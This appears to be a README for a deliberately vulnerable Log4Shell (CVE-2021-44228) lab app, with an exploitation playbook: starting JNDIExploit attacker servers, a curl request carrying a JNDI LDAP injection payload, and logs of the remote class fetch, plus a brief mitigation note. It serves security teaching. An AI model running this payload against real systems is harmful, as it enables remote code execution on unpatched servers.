# Vulnerable application

This repository contains a Spring Boot web application vulnerable to `CVE-2021-44228`, known as [log4shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses 
* `log-4j-core:2.14.1` (through `spring-boot-starter-log4j2`) and
* `openjdk:8u181`

## Running the application

Run it:

```bash
docker run --name vulnerable-app --rm -p 8080:8080 amtoya/log4shell-vulnerable-app
```

Or alternatively, build it yourself:

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
```

## Exploiting playbook

Using the following steps you can reproduce a log4shell exploit. 
If you are not familiar with how the attack works under the hood check out this [article](https://learn.snyk.io/lessons/log4shell/java/) repo.

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). I therefore recommend you to used the saved version from this repository.*

### Setup attacker servers
First we have to setup the attacker servers. This consist of
* a **LDAP server** that will redirect us to our malicious HTTP server
* a **HTTP server** that will return the harmful payload

We use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up the attacker servers.

```bash
git clone https://github.com/AmitKulkarni9/log4shell-vulnerable-app.git
cd log4shell-vulnerable-app/src/main/resources
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [your-private-ip] -p 8888
```

### Triggering the exploit
As payload we want to execute `touch /tmp/pwned` (which corresponds to the base64-encoded `dG91Y2ggL3RtcC9wd25lZAo=`) on the vulnerable applications server.

Trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl localhost:8080 -H 'user: ${jndi:ldap://[your-private-ip]:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

The output of JNDIExploit shows that the attacker servers responded with the malicious exploit and executed the payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://[your-private-ip]:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /[your-private-ip]:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

To confirm that the code execution was successful, we check that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp

...
pwned
...
```

### Mitigation Strategy

The mitigation strategy is located under doc folder. One of the strategies - Use logshell-remediation.yaml to deploy the container. The SecurityContext of readOnlyRootFilesystem: true can be used to not write into root file system to mitigate this vulnerablility.

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/  
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/  
https://github.com/christophetd/log4shell-vulnerable-app/
